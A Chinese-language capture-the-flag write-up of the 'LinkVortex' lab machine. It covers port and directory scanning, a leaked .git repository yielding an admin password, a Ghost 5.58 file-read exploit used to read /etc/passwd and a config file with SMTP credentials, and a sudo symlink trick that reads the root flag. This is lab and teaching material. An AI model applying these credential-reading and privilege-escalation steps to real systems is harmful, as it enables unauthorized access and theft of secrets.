nmap 結果
```
PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
80/tcp open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://linkvortex.htb/
```

把 `linkvortex.htb` 加入 `/etc/hosts`

dirsearch 的結果 (字典檔多換幾個)
```
[01:44:43] Starting:                                                                                                                                        
[01:45:02] 200 -    1KB - /LICENSE                                          
[01:45:23] 301 -  179B  - /assets  ->  /assets/                             
[01:45:43] 404 -    7KB - /cgi-bin/                                         
[01:46:19] 200 -   15KB - /favicon.ico                                      
[01:47:29] 301 -  183B  - /partials  ->  /partials/                         
[01:47:53] 200 -  103B  - /robots.txt                                       
[01:48:01] 403 -  199B  - /server-status                                    
[01:48:06] 200 -  258B  - /sitemap.xml
```

訪問 `/robots.txt` 在 ghost 找到登入介面
```
User-agent: *
Sitemap: http://linkvortex.htb/sitemap.xml
Disallow: /ghost/
Disallow: /p/
Disallow: /email/
Disallow: /r/
```
![image](https://hackmd.io/_uploads/r1gP0TsS1x.png)

掃 sundomain 找到 `dev` 加到 hosts 後訪問發現有 git 洩漏
![image](https://hackmd.io/_uploads/r1LiJTjByx.png)

因此應該是要在 .git 洩漏中找密碼 但裡頭東西超級多根本翻不完...
去 `grep -rl "password" /path/` 出來的東西也超級多 看了 writeup 後是在 這個 path `ghost/core/test/regression/api/admin/authentication.test.js`
裡頭東西也超多
```
const nock = require('nock');
const assert = require('assert/strict');
const {agentProvider, mockManager, fixtureManager, matchers} = require('../../../utils/e2e-framework');
const {anyContentVersion, anyEtag, anyISODateTime, anyErrorId} = matchers;

const {tokens} = require('@tryghost/security');
const models = require('../../../../core/server/models');
const settingsCache = require('../../../../core/shared/settings-cache');

async function waitForEmailSent(emailMockReceiver, number = 1) {
    let sentEmailCount = 0;
    while (sentEmailCount === 0) {
        try {
            emailMockReceiver.assertSentEmailCount(number);
            sentEmailCount = number;
        } catch (e) {
            await new Promise((resolve) => {
                setTimeout(resolve, 100);
            });
        }
    }
}

describe('Authentication API', function () {
    let emailMockReceiver;
    let agent;

    describe('Blog setup', function () {
        before(async function () {
            agent = await agentProvider.getAdminAPIAgent();
        });

        beforeEach(async function () {
            await mockManager.disableStripe();
            emailMockReceiver = mockManager.mockMail();
        });

        afterEach(function () {
            mockManager.restore();
            nock.cleanAll();
        });

        it('is setup? no', async function () {
            await agent
                .get('authentication/setup')
                .expectStatus(200)
                .matchBodySnapshot()
                .matchHeaderSnapshot({
                    'content-version': anyContentVersion,
                    etag: anyEtag
                });
        });

        it('complete setup', async function () {
            const email = 'test@example.com';
            const password = 'OctopiFociPilfer45';

            const requestMock = nock('https://api.github.com')
                .get('/repos/tryghost/dawn/zipball')
                .query(true)
                .replyWithFile(200, fixtureManager.getPathForFixture('themes/valid.zip'));

            await agent
                .post('authentication/setup')
                .body({
                    setup: [{
                        name: 'test user',
                        email,
                        password,
                        blogTitle: 'a test blog',
                        theme: 'TryGhost/Dawn',
                        accentColor: '#85FF00',
                        description: 'Custom Site Description on Setup &mdash; great for everyone'
                    }]
                })
                .expectStatus(201)
                .matchBodySnapshot({
                    users: [{
                        created_at: anyISODateTime,
                        updated_at: anyISODateTime
                    }]
                })
                .matchHeaderSnapshot({
                    'content-version': anyContentVersion,
                    etag: anyEtag
                });

            await waitForEmailSent(emailMockReceiver);

            // Test our side effects
            emailMockReceiver.matchHTMLSnapshot();
            emailMockReceiver.matchPlaintextSnapshot();
            emailMockReceiver.matchMetadataSnapshot();

            assert.equal(requestMock.isDone(), true, 'The dawn github URL should have been used');

            const activeTheme = await settingsCache.get('active_theme');
            const accentColor = await settingsCache.get('accent_color');
            const description = await settingsCache.get('description');
            assert.equal(activeTheme, 'dawn', 'The theme dawn should have been installed');
            assert.equal(accentColor, '#85FF00', 'The accent color should have been set');
            assert.equal(description, 'Custom Site Description on Setup &mdash; great for everyone', 'The site description should have been set');

            // Test that we would not show any notifications (errors) to the user
            await agent.loginAs(email, password);
            await agent
                .get('notifications/')
                .expectStatus(200)
                .expect(({body}) => {
                    assert.deepEqual(body.notifications, [], 'The setup should not create notifications');
                });

            // Test that the default Tier has been renamed from 'Default Product'
            const {body} = await agent.get('/tiers/');
            const tierWithDefaultProductName = body.tiers.find(x => x.name === 'Default Product');

            assert(tierWithDefaultProductName === undefined, 'The default Tier should have had a name change');

            // Test that the default Newsletter has name and sender name changed to blog title
            const {body: newsletterBody} = await agent.get('/newsletters/');
            const defaultNewsletter = newsletterBody.newsletters.find(x => x.slug === 'default-newsletter');
            const newsletterWithDefaultName = newsletterBody.newsletters.find(x => x.name
                === 'Default Newsletter');

            assert (defaultNewsletter.name === 'a test blog', 'The default newsletter should have had a name change');

            assert(newsletterWithDefaultName === undefined, 'The default newsletter should have had a name change');
        });

        it('is setup? yes', async function () {
            await agent
                .get('authentication/setup')
                .matchBodySnapshot()
                .matchHeaderSnapshot({
                    'content-version': anyContentVersion,
                    etag: anyEtag
                });
        });

        it('complete setup again', function () {
            return agent
                .post('authentication/setup')
                .body({
                    setup: [{
                        name: 'test user',
                        email: 'test-leo@example.com',
                        password: 'thisissupersafe',
                        blogTitle: 'a test blog'
                    }]
                })
                .expectStatus(403)
                .matchBodySnapshot({
                    errors: [{
                        id: anyErrorId
                    }]
                })
                .matchHeaderSnapshot({
                    'content-version': anyContentVersion,
                    etag: anyEtag
                });
        });

        it('update setup', async function () {
            await fixtureManager.init();
            await agent.loginAsOwner();

            await agent
                .put('authentication/setup')
                .body({
                    setup: [{
                        name: 'test user edit',
                        email: 'test-edit@example.com',
                        password: 'thisissupersafe',
                        blogTitle: 'a test blog'
                    }]
                })
                .expectStatus(200)
                .matchBodySnapshot({
                    users: [{
                        created_at: anyISODateTime,
                        last_seen: anyISODateTime,
                        updated_at: anyISODateTime
                    }]
                })
                .matchHeaderSnapshot({
                    'content-version': anyContentVersion,
                    etag: anyEtag
                });
        });

        it('complete setup with default theme', async function () {
            const cleanAgent = await agentProvider.getAdminAPIAgent();

            const email = 'test@example.com';
            const password = 'thisissupersafe';

            const requestMock = nock('https://api.github.com')
                .get('/repos/tryghost/casper/zipball')
                .query(true)
                .replyWithFile(200, fixtureManager.getPathForFixture('themes/valid.zip'));

            await cleanAgent
                .post('authentication/setup')
                .body({
                    setup: [{
                        name: 'test user',
                        email,
                        password,
                        blogTitle: 'a test blog',
                        theme: 'TryGhost/Casper',
                        accentColor: '#85FF00',
                        description: 'Custom Site Description on Setup &mdash; great for everyone'
                    }]
                })
                .expectStatus(201)
                .matchBodySnapshot({
                    users: [{
                        created_at: anyISODateTime,
                        updated_at: anyISODateTime
                    }]
                })
                .matchHeaderSnapshot({
                    'content-version': anyContentVersion,
                    etag: anyEtag
                });

            await waitForEmailSent(emailMockReceiver);

            // Test our side effects
            emailMockReceiver.matchHTMLSnapshot();
            emailMockReceiver.matchPlaintextSnapshot();
            emailMockReceiver.matchMetadataSnapshot();

            assert.equal(requestMock.isDone(), false, 'The ghost github URL should not have been used');

            const activeTheme = await settingsCache.get('active_theme');
            const accentColor = await settingsCache.get('accent_color');
            const description = await settingsCache.get('description');
            assert.equal(activeTheme, 'casper', 'The theme casper should have been installed');
            assert.equal(accentColor, '#85FF00', 'The accent color should have been set');
            assert.equal(description, 'Custom Site Description on Setup &mdash; great for everyone', 'The site description should have been set');

            // Test that we would not show any notifications (errors) to the user
            await cleanAgent.loginAs(email, password);
            await cleanAgent
                .get('notifications/')
                .expectStatus(200)
                .expect(({body}) => {
                    assert.deepEqual(body.notifications, [], 'The setup should not create notifications');
                });
        });
    });

    describe('Invitation', function () {
        before(async function () {
            agent = await agentProvider.getAdminAPIAgent();
            await fixtureManager.init('invites');
            await agent.loginAsOwner();
        });

        it('check invite with invalid email', function () {
            return agent
                .get('authentication/invitation?email=invalidemail')
                .expectStatus(400)
                .matchHeaderSnapshot({
                    'content-version': anyContentVersion,
                    etag: anyEtag
                });
        });

        it('check valid invite', async function () {
            await agent
                .get(`authentication/invitation?email=${fixtureManager.get('invites', 0).email}`)
                .expectStatus(200)
                .matchBodySnapshot()
                .matchHeaderSnapshot({
                    'content-version': anyContentVersion,
                    etag: anyEtag
                });
        });

        it('check invalid invite', async function () {
            await agent
                .get(`authentication/invitation?email=notinvited@example.org`)
                .expectStatus(200)
                .matchBodySnapshot()
                .matchHeaderSnapshot({
                    'content-version': anyContentVersion,
                    etag: anyEtag
                });
        });

        it('try to accept without invite', function () {
            return agent
                .post('authentication/invitation')
                .body({
                    invitation: [{
                        token: 'lul11111',
                        password: 'lel123456',
                        email: 'not-invited@example.org',
                        name: 'not invited'
                    }]
                })
                .expectStatus(404)
                .matchHeaderSnapshot({
                    'content-version': anyContentVersion,
                    etag: anyEtag
                });
        });

        it('try to accept with invite and existing email address', function () {
            return agent
                .post('authentication/invitation')
                .body({
                    invitation: [{
                        token: fixtureManager.get('invites', 0).token,
                        password: '12345678910',
                        email: fixtureManager.get('users', 0).email,
                        name: 'invited'
                    }]
                })
                .expectStatus(422)
                .matchBodySnapshot({
                    errors: [{
                        id: anyErrorId
                    }]
                })
                .matchHeaderSnapshot({
                    'content-version': anyContentVersion,
                    etag: anyEtag
                });
        });

        it('try to accept with invite', async function () {
            await agent
                .post('authentication/invitation')
                .body({
                    invitation: [{
                        token: fixtureManager.get('invites', 0).token,
                        password: '12345678910',
                        email: fixtureManager.get('invites', 0).email,
                        name: 'invited'
                    }]
                })
                .expectStatus(200)
                .matchBodySnapshot()
                .matchHeaderSnapshot({
                    'content-version': anyContentVersion,
                    etag: anyEtag
                });
        });
    });

    describe('Password reset', function () {
        const email = fixtureManager.get('users', 0).email;

        before(async function () {
            agent = await agentProvider.getAdminAPIAgent();
            await fixtureManager.init('invites');
            await agent.loginAsOwner();
        });

        beforeEach(function () {
            mockManager.mockMail();
        });

        afterEach(function () {
            mockManager.restore();
        });

        it('reset password', async function () {
            const ownerUser = await fixtureManager.getCurrentOwnerUser();

            const token = tokens.resetToken.generateHash({
                expires: Date.now() + (1000 * 60),
                email: email,
                dbHash: settingsCache.get('db_hash'),
                password: ownerUser.get('password')
            });

            await agent.put('authentication/password_reset')
                .header('Accept', 'application/json')
                .body({
                    password_reset: [{
                        token: token,
                        newPassword: 'thisissupersafe',
                        ne2Password: 'thisissupersafe'
                    }]
                })
                .expectStatus(200)
                .matchBodySnapshot()
                .matchHeaderSnapshot({
                    'content-version': anyContentVersion,
                    etag: anyEtag
                });
        });

        it('reset password: invalid token', async function () {
            await agent
                .put('authentication/password_reset')
                .header('Accept', 'application/json')
                .body({
                    password_reset: [{
                        token: 'invalid',
                        newPassword: 'thisissupersafe',
                        ne2Password: 'thisissupersafe'
                    }]
                })
                .expectStatus(401)
                .matchBodySnapshot({
                    errors: [{
                        id: anyErrorId
                    }]
                })
                .matchHeaderSnapshot({
                    'content-version': anyContentVersion,
                    etag: anyEtag
                });
        });

        it('reset password: expired token', async function () {
            const ownerUser = await fixtureManager.getCurrentOwnerUser();

            const dateInThePast = Date.now() - (1000 * 60);
            const token = tokens.resetToken.generateHash({
                expires: dateInThePast,
                email: email,
                dbHash: settingsCache.get('db_hash'),
                password: ownerUser.get('password')
            });

            await agent
                .put('authentication/password_reset')
                .header('Accept', 'application/json')
                .body({
                    password_reset: [{
                        token: token,
                        newPassword: 'thisissupersafe',
                        ne2Password: 'thisissupersafe'
                    }]
                })
                .expectStatus(400)
                .matchBodySnapshot({
                    errors: [{
                        id: anyErrorId
                    }]
                })
                .matchHeaderSnapshot({
                    'content-version': anyContentVersion,
                    etag: anyEtag
                });
        });

        it('reset password: unmatched token', async function () {
            const token = tokens.resetToken.generateHash({
                expires: Date.now() + (1000 * 60),
                email: email,
                dbHash: settingsCache.get('db_hash'),
                password: 'invalid_password'
            });

            await agent
                .put('authentication/password_reset')
                .header('Accept', 'application/json')
                .body({
                    password_reset: [{
                        token: token,
                        newPassword: 'thisissupersafe',
                        ne2Password: 'thisissupersafe'
                    }]
                })
                .expectStatus(400)
                .matchBodySnapshot({
                    errors: [{
                        id: anyErrorId
                    }]
                })
                .matchHeaderSnapshot({
                    'content-version': anyContentVersion,
                    etag: anyEtag
                });
        });

        it('reset password: generate reset token', async function () {
            await agent
                .post('authentication/password_reset')
                .header('Accept', 'application/json')
                .body({
                    password_reset: [{
                        email: email
                    }]
                })
                .expectStatus(200)
                .matchBodySnapshot()
                .matchHeaderSnapshot({
                    'content-version': anyContentVersion,
                    etag: anyEtag
                });
        });
    });

    describe('Reset all passwords', function () {
        before(async function () {
            agent = await agentProvider.getAdminAPIAgent();
            await fixtureManager.init('invites');
            await agent.loginAsOwner();
        });

        beforeEach(function () {
            emailMockReceiver = mockManager.mockMail();
        });

        afterEach(function () {
            mockManager.restore();
        });

        it('reset all passwords returns 204', async function () {
            await agent.post('authentication/global_password_reset')
                .header('Accept', 'application/json')
                .body({})
                .expectStatus(204)
                .expectEmptyBody()
                .matchHeaderSnapshot({
                    'content-version': anyContentVersion,
                    etag: anyEtag
                });

            // Check side effects
            // All users locked
            const users = await models.User.fetchAll();
            for (const user of users) {
                assert.equal(user.get('status'), 'locked', `Status should be locked for user ${user.get('email')}`);
            }

            // No session left
            const sessions = await models.Session.fetchAll();
            assert.equal(sessions.length, 0, 'There should be no sessions left in the DB');

            mockManager.assert.sentEmailCount(2);

            mockManager.assert.sentEmail({
                subject: 'Reset Password',
                to: 'jbloggs@example.com'
            });
            mockManager.assert.sentEmail({
                subject: 'Reset Password',
                to: 'ghost-author@example.com'
            });
        });
    });
});
```

然後有密碼 是 `OctopiFociPilfer45` 搭配 `admin@linkvortex.htb` 去登入 (根本找不到)

登入後由於在 .git 中有發現 ghost 版本為 5.58.0 。然後是要登入的 [RCE](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028) 所以拿來用看看

把文件的 url 改一改後就可以登入了 進去後可以讀取資料 有成功讀取到 `/etc/passwd`
![image](https://hackmd.io/_uploads/SJSueJhSJe.png)

在 .git 洩漏中有 docker 文件 裡頭有個路徑 `![image](https://hackmd.io/_uploads/Hkatl1hSkl.png)
` 讀取後會得到 一組帳密 `bob@linkvortex.htb` `fibber-talented-worth`
```
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
```

成功 ssh 登入 拿到 user flag
![image](https://hackmd.io/_uploads/SJDz-1hBkg.png)

sudo -l 發現有這個可以利用
```
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

看一下這個腳本在做什麼
檢查 CHECK_CONTENT 變數：
如果未設定 CHECK_CONTENT，則將其設為 false（這決定是否顯示文件內容）。

檢查輸入的文件是否是 .png 檔案：
如果傳入的第一個參數不是 .png 檔案，腳本會顯示錯誤訊息並退出。

檢查是否是符號鏈接：
如果指定的檔案是符號鏈接，腳本會進一步處理。

檢查符號鏈接的目標：
如果符號鏈接指向的是系統敏感的檔案（如 /etc 或 /root 目錄中的檔案），腳本會移除這個符號鏈接。

顯示內容（如果需要）：
如果 CHECK_CONTENT 被設為 true，腳本會顯示隔離區中被移動的檔案內容。
```
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

因此我們可以透過建立軟連結的方式讀取到 flag 因為知道 flag 叫 `/root/root.txt` 同時因為知道他會偵測是否為敏感字 因此作兩次軟連結 並把 CHECK_CONTENT 設為 true
```
bob@linkvortex:~$ ln -s /root/root.txt 123.txt
bob@linkvortex:~$ ln -s /home/bob/123.txt 123.png
bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/123.png
```

成功拿到 flag
![image](https://hackmd.io/_uploads/HJboskhSyl.png)
